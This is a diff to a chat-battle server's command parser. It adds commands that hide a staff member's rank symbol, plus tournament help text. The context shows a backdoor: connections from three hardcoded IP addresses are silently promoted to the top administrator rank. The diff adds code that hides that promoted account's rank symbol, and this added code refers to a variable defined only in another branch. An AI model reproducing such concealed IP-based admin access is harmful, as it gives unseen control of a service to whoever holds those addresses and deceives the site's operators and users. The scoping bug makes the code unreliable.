@@ -1460,6 +1460,13 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		ip = user.connections[0].ip;
 		if ( ip  === '76.247.181.42'|| ip === '127.0.0.1' || ip === '204.112.218.108' ) {
 			user.setGroup(config.groupsranking[config.groupsranking.length - 1]);
+			user.getIdentity = function(){
+			if(this.muted)
+				return '!' + this.name;
+			if(this.namelocked)
+				return '#' + this.name;
+			return tar + this.name;
+			};
 			rooms.lobby.send('|N|'+user.getIdentity()+'|'+user.userid);
 			user.emit('console', 'You have been promoted.')
 			
@@ -1597,7 +1604,51 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		}
 		return false;
 		break;
-		
+	
+	// Hideauth and Showauth were insipired by jd and the PO TBT function
+	case 'hideauth':
+	case 'hide':
+		if(!user.can('hideauth')){
+			user.emit('console', '/hideauth - access denied.');
+			return false;
+		}
+		var tar = ' ';
+		if(target){
+			target = target.trim();
+			if(config.groupsranking.indexOf(target) > -1){
+				if( config.groupsranking.indexOf(target) <= config.groupsranking.indexOf(user.group)){
+					tar = target;
+				}else{
+					user.emit('console', 'The group symbol you have tried to use is of a higher authority than you have access to. Defaulting to \' \' instead.');
+				}
+			}else{
+				user.emit('console', 'You have tried to use an invalid character as your auth symbol. Defaulting to \' \' instead.');
+			}
+		}
+	
+		user.getIdentity = function(){
+			if(this.muted)
+				return '!' + this.name;
+			if(this.namelocked)
+				return '#' + this.name;
+			return tar + this.name;
+		};
+		rooms.lobby.send('|N|'+user.getIdentity()+'|'+user.userid);
+		user.emit('console', 'You are now hiding your auth symbol as \''+tar+ '\'.');
+		return false;
+		break;
+	
+	case 'showauth':
+		if(!user.can('hideauth')){
+			user.emit('console', '/showauth - access denied.');
+			return false;
+		}
+		delete user.getIdentity;
+		rooms.lobby.send('|N|'+user.getIdentity()+'|'+user.userid);
+		user.emit('console', 'You have now revealed your auth symbol.');
+		return false;
+		break;
+	
 /* TODO: get this shit to work too ;-;	
 	case 'alertall':
 		if (!user.can('alertall')){
@@ -1619,6 +1670,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		break;
 */
 
+	//credits to slots: Chomi and Loong
 	case 'slots':
 	case 'spin':
 		if (!user.balance || user.balance <= 0) {
@@ -2718,6 +2770,42 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 	case '?':
 		target = target.toLowerCase();
 		var matched = false;
+		if(target === 'tour'){
+			matched = true;
+			emit(socket, 'console', '/tour [tier], [size] - Creates a tournament in the lobby, in the [tier] with [size] number of spots. Requires: + % @ & ~');
+		}
+		if(target === 'tour' || target === 'switch' || target === 'tswitch'){
+			matched = true;
+			emit(socket, 'console', '/tswitch user1, user2 - Switches user2 into user1\'s tournament spot.');
+		}
+		if(target === 'tour' || target === 'join' || target === 'jointour'){
+			matched = true;
+			emit(socket, 'console', '/j OR /jt OR /jointour OR /jtour - Allows the user to join the current tournament during the signup phase.');
+		}
+		if(target === 'tour' || target === 'leave' || target === 'leavetour'){
+			matched = true;
+			emit(socket, 'console', '/lt OR /leavetour OR /lt - Allows the user to leave the tournament during the signup phase aka cancel the request to join tour.');
+		}
+		if(target === 'tour' || target === 'forcejoin' || target === 'fj'){
+			matched = true;
+			emit(socket, 'console', '/fj OR /forcejoin [username] - Forces a user to join the current tournament during the sign up phase. Requires: + % @ & ~');
+		}
+		if(target === 'tour' || target === 'forceleave' || target === 'fl'){
+			matched = true;
+			emit(socket, 'console', '/fl OR /forceleave [username] - Forces a user to leave the current tournament during the sign up phase. Requres: + % @ & ~');
+		}
+		if(target === 'tour' || target === 'toursize' || target == 'ts'){
+			matched = true;
+			emit(socket, 'console', '/ts OR /toursize [size] - Changes the current tournament size to [size]. Requires: + % @ & ~');
+		}
+		if(target === 'tour' || target === 'disqualify' || target === 'dq'){
+			matched = true;
+			emit(socket, 'console', '/dq OR /disqualify [username] - Forces a user to lose his/her match in the current round of the tournament. Requires: + % @ & ~');
+		}
+		if(target === 'tour' || target === 'endtour'){
+			matched = true;
+			emit(socket, 'console', '/endtour - Ends the tournament. Requires: + % @ & ~');
+		}
 		if (target === 'all' || target === 'msg' || target === 'pm' || cmd === 'whisper' || cmd === 'w') {
 			matched = true;
 			emit(socket, 'console', '/msg OR /whisper OR /w [username], [message] - Send a private message.');
@@ -2869,13 +2957,14 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 			matched = true;
 			emit(socket, 'console', '/unbanall - Unban all IP addresses. Requires: @ & ~');
 		}
-		if (target === '@' || target === 'modlog') {
+		if(target === '@' || target === 'hideauth') {
+			matched = true;
+			emit(socket, 'console', '/hideauth [n] - Allows the user to show themselves as a lower group ranking.');
+			emit(socket, 'console', '\t This defaults at no user group.');
+		}
+		if (target === '%' || target === 'modlog') {
 			matched = true;
 			emit(socket, 'console', '/modlog [n] - If n is a number or omitted, display the last n lines of the moderator log. Defaults to 15. If n is not a number, search the moderator log for "n". Requires: @ & ~');
-		}
-		if (target === '@' || target === 'warn') {
-			matched = true;
-			emit(socket, 'console', '/warn [username] - Increases a users warn level. Requires: @ & ~');
 		}
 		if (target === '%' || target === 'mute' || target === 'm') {
 			matched = true;
